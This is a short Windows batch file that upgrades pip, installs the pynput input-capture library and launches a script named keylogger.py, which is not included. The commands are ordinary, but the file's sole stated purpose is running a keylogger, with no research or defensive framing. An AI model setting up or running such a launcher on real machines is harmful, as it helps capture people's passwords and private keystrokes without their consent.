@echo off
SETLOCAL

:: Check for pip and update if necessary
python -m ensurepip --upgrade
python -m pip install --upgrade pip

:: Install required packages
python -m pip install pynput

:: Run the keylogger script
python keylogger.py

ENDLOCAL
pause
